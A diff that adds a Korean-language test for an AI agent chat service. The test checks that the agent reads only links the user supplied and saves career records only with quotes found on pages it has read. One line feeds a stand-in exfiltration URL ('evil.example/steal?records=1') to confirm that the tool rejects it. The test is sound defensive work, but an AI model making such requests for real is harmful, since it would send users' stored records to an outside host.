@@ -594,6 +594,31 @@ describe.skipIf(!(process.env.TEST_MONGODB_ADMIN_URL ?? process.env.TEST_MONGODB
     expect(await count()).toBe(before);
     expect((await service.recentDigests(userId)).find(item => item.conversationId === row.id)!.outcomes).toEqual([]);
   });
+  it("사용자가 적은 링크만 읽고, 읽은 페이지 글의 인용으로 기록을 저장한다", async () => {
+    const category = (await career.listCategories(userId))[0]!;
+    const readme = "모아는 Next.js와 Supabase로 만든 가계부입니다. 카드 내역을 불러와 지출을 분류하고, 달마다 예산을 넘으면 알려 줍니다.";
+    const fetched: string[] = [];
+    const fetchLink = async (url: string) => { fetched.push(url); return { body: `<html><head><title>me/moa</title></head><body><article>${readme.repeat(4)}</article></body></html>`, finalUrl: url, contentType: "text/html" }; };
+    let saved: Awaited<ReturnType<Parameters<AgentRuntime["run"]>[0]["saveRecord"]>> | undefined;
+    const service = new AgentChatService(fixture.resource, { run: async input => {
+      const question = input.messages.at(-1)!;
+      const body = { title: "모아 가계부", categoryId: category.id, bodyMd: "## 행동\n가계부 서비스를 만들었다\n## 링크에서 확인한 내용\n- Next.js와 Supabase로 만든 가계부" };
+      // 대화에 없는 주소, 읽기 전의 링크 인용은 돌려보낸다.
+      await expect(input.readLink("https://evil.example/steal?records=1")).rejects.toBeInstanceOf(AgentToolRejection);
+      await expect(input.saveRecord({ ...body, sources: [{ url: "https://github.com/me/moa", quote: "Next.js와 Supabase로 만든 가계부" }] }, "l0")).rejects.toMatchObject({ issues: [expect.stringContaining("read_link로 읽은 주소가 아닙니다")] });
+      const page = await input.readLink("https://github.com/me/moa");
+      expect(page.text).toContain("Next.js와 Supabase로");
+      await expect(input.saveRecord({ ...body, sources: [{ url: "https://github.com/me/moa", quote: "Kubernetes로 배포" }] }, "l0")).rejects.toBeInstanceOf(AgentToolRejection);
+      saved = await input.saveRecord({ ...body, sources: [{ messageId: question.id, quote: "가계부 서비스를 만들었어요" }, { url: "https://github.com/me/moa", quote: "Next.js와 Supabase로 만든 가계부" }] }, "l1");
+    } }, career, { get: async () => { throw new Error("없는 공고"); } }, documents, consent, new AgentCredentials(fixture.resource), new PortfolioReadService(fixture.resource), new PageService(fixture.resource), undefined, undefined, undefined, undefined, undefined, undefined, undefined, fetchLink);
+    services.push(service);
+    const row = await service.create(userId, []);
+    await service.send(userId, row.id, { requestId: randomUUID(), text: "가계부 서비스를 만들었어요. 저장소는 github.com/me/moa 예요." });
+    await expect.poll(async () => (await service.get(userId, row.id)).run?.status).toBe("complete");
+    expect(fetched).toEqual(["https://github.com/me/moa"]);
+    expect(saved?.sources).toContainEqual({ url: "https://github.com/me/moa", quote: "Next.js와 Supabase로 만든 가계부" });
+    expect(await career.getRecord(userId, saved!.recordId)).toMatchObject({ title: "모아 가계부", origin: "ai" });
+  });
   it("입력 칸 묶음에 한 답은 칸 이름과 값의 글로 남고 부품에 적히며, 빈 필수 칸은 받지 않는다", async () => {
     const service = make({ run: async input => {
       if (input.messages.at(-1)!.reply) { await input.emit({ type: "text", text: "알겠습니다." }); return; }
